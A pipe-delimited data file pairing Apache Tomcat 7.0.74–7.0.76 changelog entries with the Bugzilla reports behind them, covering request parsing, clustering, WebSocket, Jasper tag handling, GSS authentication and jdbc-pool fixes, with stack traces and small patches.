Coyote|Tomcat 7.0.76 (markt)|add|60594|Allow some invalid characters that were recently restricted to be processed in requests by using the system property tomcat.util.http.parser.HttpParser.requestTargetAllow. (csutherl)|RFC 7230/3986 url requirement that prevents unencoded curly braces should be optional, since it breaks existing sites|"Using the protocol=""HTTP/1.1"" connector (Coyote)

After upgrading a site to Tomcat 7.0.73 from 7.0.72 or from anything earlier, a url with an unencoded { or } (ie. http://my.com?filter={""search"":""isvalid""} ), now returns a 400 error code and logs the following error message:

""INFO: Error parsing HTTP request header
 Note: further occurrences of HTTP header parsing errors will be logged at DEBUG level.
java.lang.IllegalArgumentException: Invalid character found in the request target. The valid characters are defined in RFC 7230 and RFC 3986""

Resolution:
Since this is a breaking change (aka regression failure), there should be an option to override and turn this off (still reporting the first occurrence as shown above), so that any existing site which experiences this can choose to ignore this failure and continue as before, so they can deal with changing their application at a later date, if they deem the security risk is appropriate.

Defaulting the option to true (to enable the check) is perfectly fine, as long as there is an option in a server and/or application config file to disable it, and proper documentation on it.

Either this, or you clearly state in the release notes of 7.0.73, exactly what will break, and recommend that users do not perform the Tomcat update, if they are not ready to change their applications to comply, but I think this would open up an even bigger can of worms.

Instead of just saying:
""Add additional checks for valid characters to the HTTP request line parsing so invalid request lines are rejected sooner. (markt)"" - this tells us nothing about the impending doom we may face.

But, I would recommend just giving us the option to decide for ourselves."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60594
Jasper|Tomcat 7.0.76 (markt)|fix||Refactor code generated for JSPs to reduce the size of the code required for tags. (markt)|||
Cluster|Tomcat 7.0.76 (markt)|add||Make the accessTimeout configurable in ClusterSingleSignOn. The accessTimeout is used as a timeout period for PING in replication map. (kfujino)|||
Cluster|Tomcat 7.0.76 (markt)|fix|60806|To avoid ClassNotFoundException, make sure that the web application class loader is passed to ReplicatedContext. (kfujino)|Problem with ServletContext replication|"Environment:
  Apache Tomcat 8.5.11
  OpenJDK Runtime Environment (build 1.8.0_121-b13)
  Centos 7.3 (64 bit)

I have a two node Tomcat cluster (server1 & server2) with an Apache load balancer.

Context replication is enabled with:
    <Context className=""org.apache.catalina.ha.context.ReplicatedContext""/>
in META-INF/context.xml, and
    <distributable/>
in WEB-INF/web.xml.

When I place an object in the server1 ServletContext I see the following error on server2:

02-Mar-2017 11:31:28.088 SEVERE
[Tribes-Task-Receiver[Catalina-Channel]-3]
org.apache.catalina.tribes.tipis.AbstractReplicatedMap.messageReceived
Unable to deserialize MapMessage.
 java.lang.ClassNotFoundException: com.pharmhos.merlin.jaas.AdUser
        at java.net.URLClassLoader.findClass(URLClassLoader.java:381)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:424)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
        at java.lang.Class.forName0(Native Method)
        at java.lang.Class.forName(Class.java:348)
        at java.io.ObjectInputStream.resolveClass(ObjectInputStream.java:677)
        at org.apache.catalina.tribes.io.ReplicationStream.resolveClass(ReplicationStream.java:79)
        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1819)
        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1713)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1986)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1535)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422)
        at org.apache.catalina.tribes.io.XByteBuffer.deserialize(XByteBuffer.java:558)
        at org.apache.catalina.tribes.tipis.AbstractReplicatedMap$MapMessage.value(AbstractReplicatedMap.java:1504)
        at org.apache.catalina.tribes.tipis.AbstractReplicatedMap$MapMessage.deserialize(AbstractReplicatedMap.java:1462)
        at org.apache.catalina.tribes.tipis.AbstractReplicatedMap.messageReceived(AbstractReplicatedMap.java:649)
        at org.apache.catalina.tribes.group.GroupChannel.messageReceived(GroupChannel.java:300)
        at org.apache.catalina.tribes.group.ChannelInterceptorBase.messageReceived(ChannelInterceptorBase.java:83)
        at org.apache.catalina.tribes.group.ChannelInterceptorBase.messageReceived(ChannelInterceptorBase.java:83)
        at org.apache.catalina.tribes.group.interceptors.TcpFailureDetector.messageReceived(TcpFailureDetector.java:116)
        at org.apache.catalina.tribes.group.ChannelInterceptorBase.messageReceived(ChannelInterceptorBase.java:83)
        at org.apache.catalina.tribes.group.ChannelCoordinator.messageReceived(ChannelCoordinator.java:276)
        at org.apache.catalina.tribes.transport.ReceiverBase.messageDataReceived(ReceiverBase.java:244)
        at org.apache.catalina.tribes.transport.nio.NioReplicationTask.drainChannel(NioReplicationTask.java:213)
        at org.apache.catalina.tribes.transport.nio.NioReplicationTask.run(NioReplicationTask.java:101)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)

It appears that my AdUser object is being serialized on server1 but is not being deserialized on server2.

The ""AdUser"" class exists within the web application under WEB-INF/classes but it looks like the org.apache.catalina.tribes.io.ReplicationStream is not finding the right class loader for the web app.

According to <kfujino@apache.org>:
> This seems to ReplicatedContext's bug.
> In the current code, the class loader is passed to ReplicationMap as Null.
> It is necessary to call super.startInternal() before initializing the ReplicationMap."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60806
WebSocket|Tomcat 7.0.76 (markt)|fix|60617|Correctly create a CONNECT request when establishing a WebSocket connection via a proxy. Patch provided by Svetlin Zarev. (markt)|WsWebSocketContainer generates bad CONNECT request when proxy is used|"Issue Description
===

WsWebSocketContainer generates bad CONNECT request when a proxy is used. The host does not contain port information, hence the app cannot connect to wss:// endpoints. Also some stricter proxy servers may reject requests without port info, thus making WsWebSocketContainer.connectToServer() fail for both ws:// and wss:// endpoints.

Steps to reproduce
===

Prerequisites
---
1. Download Tomcat 8.5.9
2. Configure it to use port 8081
3. Clone git@github.com:adamfisk/LittleProxy.git
4. Clone MCVE: git@github.com:SvetlinZarev/websocket-tomcat-bug.git
5. Build (3), (4) -> mvn clean install (you may want to rename the mcve to ROOT)

You can use any other proxy if you already have one.

How to reproduce it
---
1. Start LittleProxy (it defaults to port 8080)
2. Configure Tomcat use the proxy: export CATALINA_OPTS=""-Dhttp.proxyHost=localhost -Dhttp.proxyPort=8080 -Dhttps.proxyHost=localhost -Dhttps.proxyPort=8080""
3. Start tomcat: catalina.sh run
4. Request the mcve: http://localhost:8081/ws

Expected behavior
---
You should see: 

Connected. Sending message...
Message: Hello World!
Disconnected: 

Actual behavior
---
An exception is thrown. In case of LittleProxy it is a timeout exception during channel.handshake().get(); In my other case it is a DeploymentException caused by a bad request, because the (stricter) proxy rejected the request because  it does not contain port info.

Additional information
---
You can play with the mcve by adding the following request parameters:
* scheme - i.e. ws://, wss://
* server - i.e. echo.websocket.org
Request the mcve with: http://localhost:8081/ws?scheme=wss://&server=echo.websocket.org:443

It will succeed. Now remove the port from the server string. It will fail.

===

According to rfc2817 section 5.2:

    A CONNECT method requests that a proxy establish a tunnel connection on its behalf. The Request-URI portion of the Request-Line is always an 'authority' as defined by URI Generic Syntax [2], which is to say the host name and port number destination of the requested connection separated by a colon

Also by the never finalized draft https://tools.ietf.org/html/draft-luotonen-web-proxy-tunneling-01#section-3.1:

    The client connects to the proxy server, and uses the CONNECT method to specify the hostname and the port number to connect to. The hostname and port number are separated by a colon, and both of them must be specified"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60617
Tribes|Tomcat 7.0.76 (markt)|fix||Ensure that NoRpcChannelReply messages are not received on RpcCallback. (kfujino)|||
Tribes|Tomcat 7.0.76 (markt)|fix|60722|Take account of the dispatchersUseEncodedPaths setting on the current Context when generating paths for dispatches triggered by AsyncContext.dispatch(). (markt)|"URLEncoding error in combination with Spring DeferredResult and ""%25"" character in PathVariable"|"reference reported bug at Spring:
https://jira.spring.io/browse/SPR-15242


URLEncoding error in combination with DeferredResult and ""%25"" character in PathVariable

There is a bug in combination with Percentage Encoding for the ""%"" character.
In combination with the DeferredResult and using @PathVariable.
For any other legal Percentage Encoding it works fine, except for the ""%25"", i.e. ""%"" character.
Here is the code snippet:
----
    @RequestMapping(value = ""/test/{path_variable}"", method = RequestMethod.GET)
    public DeferredResult<String> test(@PathVariable String path_variable) {
        DeferredResult<String> response = new DeferredResult<>();
 
        LOG.info(""Request for {}"", path_variable);
        
        try {
            response.setResult(""Hello World"");
        }
        catch (Error e) {
            LOG.debug(""Error"", e);
        }
        catch (Exception e) {
            LOG.debug(""Exception"", e);
        }
 
        return response;
    }
----"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60722
Other|Tomcat 7.0.76 (markt)|fix|60620|Fix configuration of Eclipse projects, broken by introduction of SafeForkJoinWorkerThreadFactory helper class. This class cannot be built with Java 6. (kkolinko)|[JRE] Memory leak found in java.util.concurrent.ForkJoinPool|"Filing a bug for an already fixed issue, to summarize discussions spawned across different mailing lists, and for better changelog.


See ""Tomcat 8, 8.5 and 9 returning another apps environment with context.lookup() from a .parallelStream()"", 2017-01-08 on users@
http://markmail.org/message/qcy6rqhw52sspyv7

See ""Memory leak found in java.util.concurrent.ForkJoinPool"", 2017-01-09 on dev@
http://markmail.org/message/7w5wspqeayx7dr5x"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60620
Other|Tomcat 7.0.76 (markt)|update||Update the packaged version of the Tomcat Native Library to 1.2.12 to pick up the latest Windows binaries built with OpenSSL 1.0.2k. (violetagg)|||
Other|Tomcat 7.0.76 (markt)|add|60784|Update all unit tests that test the HTTP status line to check for the required space after the status code. Patch provided by Michael Osipov. (markt)|HTTP status line tests ignore trailing space after status code in status line (incomplete RFC test)|"Created attachment 34783 [details]
Test for trailing space in status line

RFC mandates for status line a mandatory space (U+0020) and optional reason phrase. Several tests do not check for or even trim the status line.

The attached patch adds the space to the tests."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60784
Other|Tomcat 7.0.76 (markt)|update||Update the NSIS Installer used to build the Windows installer to version 3.01. (markt)|||
Other|Tomcat 7.0.76 (markt)|fix||Refactor the build script and the NSIS installer script so that either NSIS 2.x or NSIS 3.x can be used to build the installer. This is primarily to re-enable building the installer on the Linux based CI system where the combination of NSIS 3.x and wine leads to failed installer builds. (markt)|||
Cluster|Tomcat 7.0.75 (violetagg)|add||Make the accessTimeout configurable in BackupManager. The accessTimeout is used as a timeout period for PING in replication map. (kfujino)|||
Web applications|Tomcat 7.0.75 (violetagg)|fix||Ensure the ASF logo image is correctly displayed in docs and host-manager applications. (violetagg)|||
Catalina|Tomcat 7.0.74 (violetagg)|add|53602|Add HTTP status code 451 (RFC 7725) to the list of HTTP status codes recognised by Tomcat. (markt)|Support for HTTP status code 451|"Index: java/org/apache/tomcat/util/http/res/LocalStrings.properties
===================================================================
--- java/org/apache/tomcat/util/http/res/LocalStrings.properties        (revision 1365543)
+++ java/org/apache/tomcat/util/http/res/LocalStrings.properties        (working copy)
@@ -65,6 +65,7 @@
 sc.428=Precondition Required
 sc.429=Too Many Requests
 sc.431=Request Header Fields Too Large
+sc.451=Unavailable For Legal Reasons
 sc.500=Internal Server Error
 sc.501=Not Implemented
 sc.502=Bad Gateway


Submitting as enhancement instead of committing in case anyone has an objection."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53602
Catalina|Tomcat 7.0.74 (violetagg)|fix||Correctly handle the configClass attribute of a Host when embedding Tomcat. (markt)|||
Catalina|Tomcat 7.0.74 (violetagg)|fix|60379|Dispose of the GSS credential once it is no longer required. Patch provided by Michael Osipov. (markt)|GenericPrincipal never frees GSSCredential|"Created attachment 34453 [details]
Patch for disposing the delegated GSS credential

GenericPrincipal#logout() implementation never frees GSSCredential on logout but the contract of GSSCredential#dispose() requires to be called as soon as this senstivive auth data is not needed anymore.

A simple
if (gssCredential != null) {
    gssCredential.dispose();
}

can be added to the #logout() implementation.

See http://docs.oracle.com/javase/7/docs/api/org/ietf/jgss/GSSCredential.html#dispose() of dispose().

This issue will likely apply to 9.0.x as well."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60379
Catalina|Tomcat 7.0.74 (violetagg)|fix|60380|Ensure that a call to HttpServletRequest#logout() triggers a call to TomcatPrincipal#logout(). Based on a patch by Michael Osipov. (markt)|HttpServletRequest#logout() never calls TomcatPrincipal#logout()|"If the client code calls HttpServletRequest#logout(), it is delegated to getContext().getAuthenticator().logout(this); but AuthenticatorBase#logout(Request) never calls TomcatPrincipal#logout() to free resources. The only spot where this method is called is in StandardSession#expire(boolean).

A completely request-based application cannot free the principal without ugly hacks."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60380
Catalina|Tomcat 7.0.74 (violetagg)|fix|60387|Correct the javadoc for o.a.catalina.AccessLog.setRequestAttributesEnabled. The default value is different for the different implementations. (violetagg)|AccessLog#setRequestAttributesEnabled states that the default value is true while it is false|Unless I am missing something, the javadoc for AccessLog#setRequestAttributesEnabled should be fixed to state that the default value is false. In 8.5.6 it's explicitly stating that the default is true.|https://bz.apache.org/bugzilla/show_bug.cgi?id=60387
Catalina|Tomcat 7.0.74 (violetagg)|code|60393|Use consistent parameter naming in implementations of Realm#authenticate(GSSContext, boolean). (markt)|Inconsistent parameter naming between Realm interface and implementations|"the method #authenticate(GSSContext, boolean) has the boolean variable named ""storeCreds"", some implementations have ""storeCred"". It spreads inconsistently. Given that the GSSCredential is singular, the boolean variable should be too.

Attached is a patch to fix this inconsistency."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60393
Catalina|Tomcat 7.0.74 (violetagg)|fix|60395|Log when an Authenticator passes an incomplete GSSContext to a Realm since it indicates a bug in the Authenticator. Patch provided by Michael Osipov. (markt)|Log if GSSContext passed to RealmBase#authenticate(GSSContext, boolean) is not fully established|org.apache.catalina.realm.RealmBase.authenticate(GSSContext, boolean) does not log when an incomplete GSS context is passed, it simply returns null. Given that an authenticator is incorrectly implemented, this would be unnnoticed. Many resources on the net never care about context completion and think pass token and this is it.|https://bz.apache.org/bugzilla/show_bug.cgi?id=60395
Catalina|Tomcat 7.0.74 (violetagg)|update||Update the warnings that reference required options for running on Java 9 to use the latest syntax for those options. (markt)|||
Catalina|Tomcat 7.0.74 (violetagg)|fix|60513|Fix thread safety issue with RMI cleanup code. (remm)|RMI leak cleaning is not thread safe|"As reported via users list.
https://lists.apache.org/thread.html/7b6c57b1838f180019bdd2bf8bf673b3b2365fe74f0e035b3b20cf8c@%3Cusers.tomcat.apache.org%3E

With multiple start/stop threads, concurrent calls are possible to the RMI leak cleaning which is not thread safe."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60513
Catalina|Tomcat 7.0.74 (violetagg)|add|60620|Extend the JreMemoryLeakPreventionListener to provide protection against ForkJoinPool.commonPool() related memory leaks. (markt)|[JRE] Memory leak found in java.util.concurrent.ForkJoinPool|"Filing a bug for an already fixed issue, to summarize discussions spawned across different mailing lists, and for better changelog.


See ""Tomcat 8, 8.5 and 9 returning another apps environment with context.lookup() from a .parallelStream()"", 2017-01-08 on users@
http://markmail.org/message/qcy6rqhw52sspyv7

See ""Memory leak found in java.util.concurrent.ForkJoinPool"", 2017-01-09 on dev@
http://markmail.org/message/7w5wspqeayx7dr5x"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60620
Coyote|Tomcat 7.0.74 (violetagg)|fix||Ensure that the endpoint is able to unlock the acceptor thread during shutdown if the endpoint is configured to listen to any local address of a specific type such as 0.0.0.0 or ::. (markt)|||
Coyote|Tomcat 7.0.74 (violetagg)|fix||Ensure sendfile is enabled by default for APR. (markt)|||
Coyote|Tomcat 7.0.74 (violetagg)|fix||Prevent read time out when the file is deleted while serving the response. The issue was observed only with APR Connector and sendfile enabled. (violetagg)|||
Coyote|Tomcat 7.0.74 (violetagg)|fix||Improve the logic that selects an address to use to unlock the Acceptor to take account of platforms what do not listen on all local addresses when configured with an address of 0.0.0.0 or ::. (markt)|||
Coyote|Tomcat 7.0.74 (violetagg)|fix|60409|When unable to complete sendfile request, ensure the Processor will be added to the cache only once. (markt/violetagg)|IllegalArgumentException at java.nio.Buffer.position at SocketWrapperBase.transfer()|"An unexpected exception found in log.

SEVERE: Error finishing response
java.lang.IllegalArgumentException
  at java.nio.Buffer.position(Buffer.java:244)
  at sun.nio.ch.IOUtil.write(IOUtil.java:68)
  at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471)
  at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:134)
  at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101)
  at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:157)
  at org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper.doWrite(NioEndpoint.java:125
  at org.apache.tomcat.util.net.SocketWrapperBase.doWrite(SocketWrapperBase.java:670)
  at org.apache.tomcat.util.net.SocketWrapperBase.flushBlocking(SocketWrapperBase.java:60
  at org.apache.tomcat.util.net.SocketWrapperBase.flush(SocketWrapperBase.java:597)
  at org.apache.coyote.http11.Http11OutputBuffer.flushBuffer(Http11OutputBuffer.java:519)
  at org.apache.coyote.http11.Http11OutputBuffer.finishResponse(Http11OutputBuffer.java:318)
  at org.apache.coyote.http11.Http11Processor.endRequest(Http11Processor.java:1458)
  at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:823)
  at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
  at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:7
  at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1455)
  at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
  at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
  at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
  at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
  at java.lang.Thread.run(Thread.java:745)

I'm not sure but cause may be the same as in recently fixed bug 60372. SocketWrapperBase also does not guard Buffer.limit() usages. Looks like all usages of this method on reusable buffers should be checked."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60409
Jasper|Tomcat 7.0.74 (violetagg)|add|44294|Add support for varargs in UEL expressions. (markt)|Support for EL functions with varargs|"Varargs <http://java.sun.com/j2se/1.5.0/docs/guide/language/varargs.html> could
be supported easily since it is possible to retrieve the information whether or
not method has vargargs and vararg can only exist as last argument."|https://bz.apache.org/bugzilla/show_bug.cgi?id=44294
Jasper|Tomcat 7.0.74 (violetagg)|fix|60356|Fix pre-compilation of JSPs that depend on nested tag files packaged in a JAR. (markt)|Compiling tagx using JspC as ant task fails when tagx recursive and packaged in jar|"Created attachment 34433 [details]
Test Case

We recently changed the way we distribute out tag libraries, and now package them within a jar file. We have a nightly deploy and test. After this change the deployed server was working fine, but the test compilation of the tag library now fails.

Attached is a cut-down test case that shows the issue. If you run

ant -Dtomcat.dir=PATH_TO_TOMCAT7

you will see the error:
build.xml:38: org.apache.jasper.JasperException: java.io.FileNotFoundException: /META-INF/tags/listitems.tagx

If you take the same war file and deploy it, you can view the welcome page and the tag works as expected. You should see:

<!DOCTYPE html>
<html>
  <head>
    <title>Example of tagx file with self reference packaged in jar</title>
  </head>
  <body>
    <p>A list of my favourite things</p>
    <ul><li>raindrops on roses</li><li>whiskers on kittens</li><li>bright copper kettles</li><li>warm wollen mittens</li><li>brown paper packages tied up with string</li></ul>
  </body>
</html>

You don't see this issue if the tagx is not recursive."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60356
Jasper|Tomcat 7.0.74 (violetagg)|fix|60431|Improve handling of varargs in UEL expressions. Based on a patch by Ben Wolfe. (markt)|EL function varargs with array|"The varargs implementation of the ASTFunction treats arrays in the final parameter as a single parameter. 

Example jsp:

<%@ taglib uri=""/myfunctions"" prefix=""myfn""%>
<c:set var=""myarray"" value=""${myfn:split( myvar, '@' )}"")
<c:set var=""pageTitle"" value=""${myfn:getTitle( myobj, myarray )}""/>

myfunctions.java has:
public static String getTitle(String key, String... args) { }

The array passed in jsp should be treated as the whole argument to getTitle.  The current implementation converts the passed array to be the first element in a new array and passes that to getTitle."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60431
Jasper|Tomcat 7.0.74 (violetagg)|fix|60497|Restore previous tag reuse behavior following the use of try/finally. (remm)|JSP custom tags returned to the tag pools to be reused without executing the doEndTag method|"As a result of the modification made in the change set ""1754112 Improve the error handling for custom tags to ensure that the tag is returned to the pool or released and destroyed once used"", Tomcat server version 8.5.5 (or higher up to 8.5.9) will return a JSP custom tag instance back to the tag pool for reuse, even after the execution of the tag's doStartTag method throws an exception.  This violates the JSP specification that specifies that JSP tags should never be reused in case of an exception.

We ran into a problem when running a Struts 1 application that makes use of the Struts Nested tag library under Tomcat 8.5.5. (We have similar problems for the DisplayTag as well.) Here is a simplified example to illustrate the problem. Consider the following three simple Java classes, namely, Form.java, Parent.java, and Child.java:

public class Form {

    private List<Parent> parents;

    public List<Parent> getParents() {
        return parents;
    }

    public void setParents(List<Parent> parents) {
        this.parents = parents;
    }
}


public class Parent {
    private String name;
    private List<Child> children;

    public Parent(String name) {
        this.name = name;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public List<Child> getChildren() {
        return children;
    }

    public void setChildren(List<Child> children) {
        this.children = children;
    }
}



public class Child {
    private String name;
    private Parent parent;

    public Child(String name){
        this.name = name;
    }


    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public Parent getParent() {
        return parent;
    }

    public void setParent(Parent parent) {
        this.parent = parent;
    }
}


Suppose we have two JSPs, say page1.jsp and page2.jsp, such that page1.jsp includes page2.jsp and that both page1.jsp and page2.jsp include a nested:iterate tag for rendering information contained in a Form instance.

page1.jsp
---------
<nested:iterate id=""parent"" name=""form"" property=""parents"" indexId=""id"">
   <jsp:include page=""/page2.jsp""/>
</nested:iterate>


page2.jsp
---------
<nested:iterate id=""child"" property=""children"" indexId=""id"">
   ... code that makes use of child ....
</nested:iterate>

Based on the current tag pool implementation, Tomcat will maintain two distinct tag pools for the nested:iterate tag, one for page1.jsp and the other for page2.jsp.
Under normal execution, i.e., without exception, the object referenced by the nested:iterate tag defined on page2.jsp from which the ""children"" property will be retrieved is a Parent instance, which is initialized by the nested:iterate tag defined on page1.jsp. However, if the execution of the nested:iterate tag's body defined on page2.jsp throws an exception, the name property of the tag instance will be incorrectly and permanently set to be ""form"", after the tag instance is returned back to the pool (associated with page2.jsp) to be reused.  As a result, all subsequent executions of page2.jsp that make use of the corrupted nested:iterate tag instance will throw an exception, since the Form.java class does not contain a property named ""children""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60497
Jasper|Tomcat 7.0.74 (violetagg)|fix||Improve the error handling for simple tags to ensure that the tag is released and destroyed once used. (remm)|||
Jasper|Tomcat 7.0.74 (violetagg)|fix|60497|Follow up fix using a better variable name for the tag reuse flag. (remm)|JSP custom tags returned to the tag pools to be reused without executing the doEndTag method|"As a result of the modification made in the change set ""1754112 Improve the error handling for custom tags to ensure that the tag is returned to the pool or released and destroyed once used"", Tomcat server version 8.5.5 (or higher up to 8.5.9) will return a JSP custom tag instance back to the tag pool for reuse, even after the execution of the tag's doStartTag method throws an exception.  This violates the JSP specification that specifies that JSP tags should never be reused in case of an exception.

We ran into a problem when running a Struts 1 application that makes use of the Struts Nested tag library under Tomcat 8.5.5. (We have similar problems for the DisplayTag as well.) Here is a simplified example to illustrate the problem. Consider the following three simple Java classes, namely, Form.java, Parent.java, and Child.java:

public class Form {

    private List<Parent> parents;

    public List<Parent> getParents() {
        return parents;
    }

    public void setParents(List<Parent> parents) {
        this.parents = parents;
    }
}


public class Parent {
    private String name;
    private List<Child> children;

    public Parent(String name) {
        this.name = name;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public List<Child> getChildren() {
        return children;
    }

    public void setChildren(List<Child> children) {
        this.children = children;
    }
}



public class Child {
    private String name;
    private Parent parent;

    public Child(String name){
        this.name = name;
    }


    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public Parent getParent() {
        return parent;
    }

    public void setParent(Parent parent) {
        this.parent = parent;
    }
}


Suppose we have two JSPs, say page1.jsp and page2.jsp, such that page1.jsp includes page2.jsp and that both page1.jsp and page2.jsp include a nested:iterate tag for rendering information contained in a Form instance.

page1.jsp
---------
<nested:iterate id=""parent"" name=""form"" property=""parents"" indexId=""id"">
   <jsp:include page=""/page2.jsp""/>
</nested:iterate>


page2.jsp
---------
<nested:iterate id=""child"" property=""children"" indexId=""id"">
   ... code that makes use of child ....
</nested:iterate>

Based on the current tag pool implementation, Tomcat will maintain two distinct tag pools for the nested:iterate tag, one for page1.jsp and the other for page2.jsp.
Under normal execution, i.e., without exception, the object referenced by the nested:iterate tag defined on page2.jsp from which the ""children"" property will be retrieved is a Parent instance, which is initialized by the nested:iterate tag defined on page1.jsp. However, if the execution of the nested:iterate tag's body defined on page2.jsp throws an exception, the name property of the tag instance will be incorrectly and permanently set to be ""form"", after the tag instance is returned back to the pool (associated with page2.jsp) to be reused.  As a result, all subsequent executions of page2.jsp that make use of the corrupted nested:iterate tag instance will throw an exception, since the Form.java class does not contain a property named ""children""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60497
Jasper|Tomcat 7.0.74 (violetagg)|fix||Revert use of try/finally for simple tags. (remm)|||
Web applications|Tomcat 7.0.74 (violetagg)|fix||Correct a typo in Host Configuration Reference. Issue reported via comments.apache.org. (violetagg)|||
Web applications|Tomcat 7.0.74 (violetagg)|add||In the documentation web application, be explicit that clustering requires a secure network for all of the cluster network traffic. (markt)|||
Web applications|Tomcat 7.0.74 (violetagg)|update||Update the ASF logos to the new versions.|||
Tribes|Tomcat 7.0.74 (violetagg)|fix||Reduce the warning logs for a message received from a different domain in order to avoid excessive log outputs. (kfujino)|||
Tribes|Tomcat 7.0.74 (violetagg)|add||Add log message that PING message has received beyond the timeout period. (kfujino)|||
Tribes|Tomcat 7.0.74 (violetagg)|fix||When a PING message that beyond the time-out period has been received, make sure that valid member is added to the map membership. (kfujino)|||
WebSocket|Tomcat 7.0.74 (violetagg)|fix|60437|Avoid possible handshake overflows in the websocket client. (remm)|SSL Handshake implementation in AsycnChannelWrapperSecure does not handle SSLEngineResult.Status.BUFFER_OVERFLOW state|"Created attachment 34494 [details]
sample program

This defect is related to an issue reported previously (https://bz.apache.org/bugzilla/show_bug.cgi?id=54997) .
With the above fix, although BUFFER_UNDERFLOW is being handled, there is still an issue with BUFFER_OVERFLOW. 

Issue is reproduced by using WebSocketContainer to connect to a server which requires clientcert authentication (  SSLEnabled=""true"" clientAuth=""true"" )


In this case, during the SSL handshake, when AsyncChannelWrapperSecure gets a handshakeStatus of NEED_UNWRAP, it needs to dynamically resize the DUMMY buffer, before invoking sslEngine.unwrap(socketReadBuffer, DUMMY), as recommended by http://docs.oracle.com/javase/7/docs/api/javax/net/ssl/SSLEngine.html . 


The handshake fails with the following error :
javax.websocket.DeploymentException: The HTTP request to initiate the WebSocket connection failed
	at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:423)
	at com.wss.WSSCLientUsingTomcatWSContainer.main(WSSCLientUsingTomcatWSContainer.java:27)
Caused by: java.util.concurrent.ExecutionException: javax.net.ssl.SSLException: TODO
	at org.apache.tomcat.websocket.AsyncChannelWrapperSecure$WrapperFuture.get(AsyncChannelWrapperSecure.java:508)
	at org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(WsWebSocketContainer.java:367)
	... 1 more
Caused by: javax.net.ssl.SSLException: TODO
	at org.apache.tomcat.websocket.AsyncChannelWrapperSecure$WebSocketSslHandshakeThread.checkResult(AsyncChannelWrapperSecure.java:427)
	at org.apache.tomcat.websocket.AsyncChannelWrapperSecure$WebSocketSslHandshakeThread.run(AsyncChannelWrapperSecure.java:391)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60437
jdbc-pool|Tomcat 7.0.74 (violetagg)|add|58816|Implement the statistics of jdbc-pool. The stats infos are borrowedCount, returnedCount, createdCount, releasedCount, reconnectedCount, releasedIdleCount and removeAbandonedCount. (kfujino)|additional jdbc pool mbean attributes - CreatedCount, BorrowedCount|"Add the BorrowedCount and CreatedCount attributes to the tomcat.jdbc mbean pools.

These attributes exist as incrementing values in the standalone Commons Pool  implementation.
It would be nice to have them in the built-in tomcat version.


CreatedCount

The total number of objects created for this pool over the lifetime of the pool.

Name: CreatedCount
Description: CreatedCount
Readable: true
Writable: false
Is: false
Type: long

BorrowedCount

The total number of objects successfully borrowed from this pool over the lifetime of the pool.

Name: BorrowedCount
Description: BorrowedCount
Readable: true
Writable: false
Is: false
Type: long


Thanks!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58816
jdbc-pool|Tomcat 7.0.74 (violetagg)|fix|60194|If validationQuery is not specified, connection validation is done by calling the isValid() method. (kfujino)|Support for isValid, needs clarification|"It is now 2016 and most people are using Java 7 or Java 8. In Java 6 the Connection.isValid() method was introduced as a way to ""ping"" a connection. Yet, for anyone wishing to implement Tomcat JDBC Pool it will appear to them as if they'll need to figure out and configure a validation query for each type of database that they'll be using. And I guess this is true. tomcat-jdbc doesn't take advantage of Connection.isValid(). The documentation doesn't mention anything about Connection.isValid() as an alternative to custom validation queries.

Other JDBC Pools takes the approach of using Connection.isValid() if present and otherwise falling back to custom query. 

While bug 48817 discusses this issue back in 2010, I cannot really see what came out it. 

I believe there are a number of things that can be done (in order of effort):

1. Improve documentation. What are people supposed to do?  Is the recommended approach to implement a custom Validator which would then call Connection.isValid()?  

2. Perhaps include a ready-made Validator which does just that. Then people can use it simply by adding config (""show them the path"").

